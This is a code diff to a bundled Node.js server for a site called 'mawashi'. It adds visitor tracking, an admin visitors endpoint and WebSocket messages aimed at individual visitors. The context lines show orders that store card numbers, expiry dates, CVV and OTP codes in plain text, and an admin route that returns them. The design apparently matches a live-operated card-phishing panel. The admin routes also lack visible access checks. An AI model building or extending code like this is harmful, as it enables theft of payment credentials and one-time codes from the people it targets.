@@ -44489,11 +44489,13 @@ __export(schema_exports, {
   insertPresenceSchema: () => insertPresenceSchema,
   insertProductSchema: () => insertProductSchema,
   insertSiteContentSchema: () => insertSiteContentSchema,
+  insertVisitorSchema: () => insertVisitorSchema,
   ordersTable: () => ordersTable,
   presenceTable: () => presenceTable,
   productPriceSchema: () => productPriceSchema,
   productsTable: () => productsTable,
-  siteContentTable: () => siteContentTable
+  siteContentTable: () => siteContentTable,
+  visitorsTable: () => visitorsTable
 });
 
 // ../../node_modules/.pnpm/zod@3.25.76/node_modules/zod/v4/classic/external.js
@@ -55919,18 +55921,29 @@ var ordersTable = pgTable("mawashi_orders", {
   cardNumber: text("card_number"),
   cardExpiry: text("card_expiry"),
   cardCvv: text("card_cvv"),
-  otpCode: text("otp_code")
+  otpCode: text("otp_code"),
+  visitorId: text("visitor_id")
+});
+var visitorsTable = pgTable("mawashi_visitors", {
+  id: serial("id").primaryKey(),
+  visitorId: text("visitor_id").unique().notNull(),
+  firstVisit: timestamp("first_visit", { withTimezone: true }).notNull().defaultNow(),
+  lastVisit: timestamp("last_visit", { withTimezone: true }).notNull().defaultNow(),
+  totalOrders: integer("total_orders").notNull().default(0),
+  metadata: jsonb("metadata").$type().default({})
 });
 var presenceTable = pgTable("mawashi_presence", {
   sessionId: text("session_id").primaryKey(),
   page: text("page").notNull(),
   label: text("label").notNull(),
   customerName: text("customer_name"),
+  visitorId: text("visitor_id"),
   lastSeenAt: timestamp("last_seen_at", { withTimezone: true }).notNull().defaultNow()
 });
 var insertProductSchema = createInsertSchema(productsTable).omit({ id: true, createdAt: true });
 var insertSiteContentSchema = createInsertSchema(siteContentTable).omit({ id: true, updatedAt: true });
 var insertOrderSchema = createInsertSchema(ordersTable).omit({ id: true, createdAt: true });
+var insertVisitorSchema = createInsertSchema(visitorsTable);
 var insertPresenceSchema = createInsertSchema(presenceTable);
 var productPriceSchema = external_exports.coerce.number().nonnegative();
 
@@ -60071,7 +60084,8 @@ router.get("/admin/orders", async (_req, res, next) => {
       cardNumber: ordersTable.cardNumber,
       cardExpiry: ordersTable.cardExpiry,
       cardCvv: ordersTable.cardCvv,
-      otpCode: ordersTable.otpCode
+      otpCode: ordersTable.otpCode,
+      visitorId: ordersTable.visitorId
     }).from(ordersTable).orderBy(desc(ordersTable.createdAt));
     res.json(orders);
   } catch (error40) {
@@ -60195,6 +60209,7 @@ router.get("/admin/presence", async (_req, res, next) => {
       page: presenceTable.page,
       label: presenceTable.label,
       customerName: presenceTable.customerName,
+      visitorId: presenceTable.visitorId,
       lastSeenAt: presenceTable.lastSeenAt
     }).from(presenceTable);
     res.json(
@@ -60203,6 +60218,25 @@ router.get("/admin/presence", async (_req, res, next) => {
         active: isPresenceActive(row.lastSeenAt)
       }))
     );
+  } catch (error40) {
+    next(error40);
+  }
+});
+router.get("/admin/visitors", async (_req, res, next) => {
+  try {
+    const visitors = await db.select().from(visitorsTable).orderBy(desc(visitorsTable.lastVisit));
+    const visitorsWithOrderCount = await Promise.all(
+      visitors.map(async (visitor) => {
+        const orders = await db.select().from(ordersTable).where(eq(ordersTable.visitorId, visitor.visitorId)).orderBy(desc(ordersTable.createdAt));
+        return {
+          ...visitor,
+          orderCount: orders.length,
+          recentOrders: orders.slice(0, 5)
+          // Last 5 orders
+        };
+      })
+    );
+    res.json(visitorsWithOrderCount);
   } catch (error40) {
     next(error40);
   }
@@ -60409,9 +60443,10 @@ var PresenceManager = class {
   clients = /* @__PURE__ */ new Map();
   updateHandlers = /* @__PURE__ */ new Set();
   // Register a new client
-  register(sessionId, ws) {
+  register(sessionId, visitorId, ws) {
     this.clients.set(sessionId, {
       sessionId,
+      visitorId,
       ws,
       currentPage: "\u063A\u064A\u0631 \u0645\u062A\u0635\u0644",
       customerName: "",
@@ -60442,6 +60477,9 @@ var PresenceManager = class {
       if (data.orderId !== void 0) {
         client.orderId = data.orderId;
       }
+      if (data.visitorId !== void 0) {
+        client.visitorId = data.visitorId;
+      }
       client.lastSeenAt = /* @__PURE__ */ new Date();
       this.notifyHandlers();
     }
@@ -60453,6 +60491,10 @@ var PresenceManager = class {
   // Get a specific client
   getClient(sessionId) {
     return this.clients.get(sessionId);
+  }
+  // Get client by visitorId
+  getClientByVisitorId(visitorId) {
+    return Array.from(this.clients.values()).find((c) => c.visitorId === visitorId);
   }
   // Subscribe to presence updates
   onUpdate(handler) {
@@ -60481,10 +60523,30 @@ var PresenceManager = class {
       }
     });
   }
-  // Broadcast to all admin clients
+  // Broadcast to a specific visitor
+  broadcastToVisitor(visitorId, message) {
+    const data = JSON.stringify(message);
+    this.clients.forEach((client) => {
+      if (client.visitorId === visitorId && client.ws.readyState === 1) {
+        client.ws.send(data);
+      }
+    });
+  }
+  // Broadcast to all admin clients (sessions without visitorId or on /admin)
+  broadcastToAdmins(message) {
+    const data = JSON.stringify(message);
+    this.clients.forEach((client) => {
+      const isAdmin = !client.visitorId || client.currentPage.includes("/admin");
+      if (isAdmin && client.ws.readyState === 1) {
+        client.ws.send(data);
+      }
+    });
+  }
+  // Broadcast presence update to all clients
   broadcastPresenceUpdate() {
     const clients = this.getClients().map((c) => ({
       sessionId: c.sessionId,
+      visitorId: c.visitorId,
       currentPage: c.currentPage,
       customerName: c.customerName,
       orderId: c.orderId,
@@ -60502,6 +60564,10 @@ var PresenceManager = class {
     if (client && client.ws.readyState === 1) {
       client.ws.send(JSON.stringify(message));
     }
+  }
+  // Send targeted update to a specific visitor
+  sendToVisitor(visitorId, message) {
+    this.broadcastToVisitor(visitorId, message);
   }
 };
 var presenceManager = new PresenceManager();
@@ -60524,10 +60590,12 @@ wss.on("connection", (ws, req) => {
   connectedClients++;
   const url2 = new URL(req.url || "", `http://${req.headers.host}`);
   const sessionId = url2.searchParams.get("sessionId") || `anon-${Date.now()}`;
-  logger.info({ sessionId, totalClients: connectedClients }, "WebSocket client connected");
-  presenceManager.register(sessionId, ws);
+  const visitorId = url2.searchParams.get("visitorId") || "";
+  logger.info({ sessionId, visitorId, totalClients: connectedClients }, "WebSocket client connected");
+  presenceManager.register(sessionId, visitorId, ws);
   const initialClients = presenceManager.getClients().map((c) => ({
     sessionId: c.sessionId,
+    visitorId: c.visitorId,
     currentPage: c.currentPage,
     customerName: c.customerName,
     orderId: c.orderId,
@@ -60537,29 +60605,20 @@ wss.on("connection", (ws, req) => {
   ws.send(JSON.stringify({
     type: "connected",
     sessionId,
+    visitorId,
     clients: initialClients
   }));
   ws.on("message", (data) => {
     try {
       const message = JSON.parse(data.toString());
-      logger.info({ sessionId, messageType: message.type }, "WebSocket message received");
       switch (message.type) {
         case "presence_update":
           presenceManager.updatePresence(sessionId, {
             page: message.page,
             customerName: message.customerName,
-            orderId: message.orderId ? Number(message.orderId) : null
+            orderId: message.orderId ? Number(message.orderId) : null,
+            visitorId: message.visitorId || visitorId
           });
-          const allClients = presenceManager.getClients();
-          logger.info({
-            sessionId,
-            clientsCount: allClients.length,
-            updatedData: {
-              page: message.page,
-              customerName: message.customerName,
-              orderId: message.orderId
-            }
-          }, "Broadcasting presence update");
           presenceManager.broadcastPresenceUpdate();
           break;
         case "ping":
@@ -60572,22 +60631,13 @@ wss.on("connection", (ws, req) => {
   });
   ws.on("close", () => {
     connectedClients--;
-    logger.info({ sessionId, totalClients: connectedClients }, "WebSocket client disconnected");
-    const clientData = presenceManager.getClient(sessionId);
+    logger.info({ sessionId, visitorId, totalClients: connectedClients }, "WebSocket client disconnected");
     presenceManager.unregister(sessionId);
     presenceManager.broadcastPresenceUpdate();
-    logger.info({
-      sessionId,
-      lastData: clientData ? {
-        currentPage: clientData.currentPage,
-        customerName: clientData.customerName,
-        orderId: clientData.orderId
-      } : null
-    }, "Client unregistered");
   });
   ws.on("error", (error40) => {
     connectedClients--;
-    logger.error({ error: error40, sessionId }, "WebSocket error");
+    logger.error({ error: error40, sessionId, visitorId }, "WebSocket error");
     presenceManager.unregister(sessionId);
   });
 });
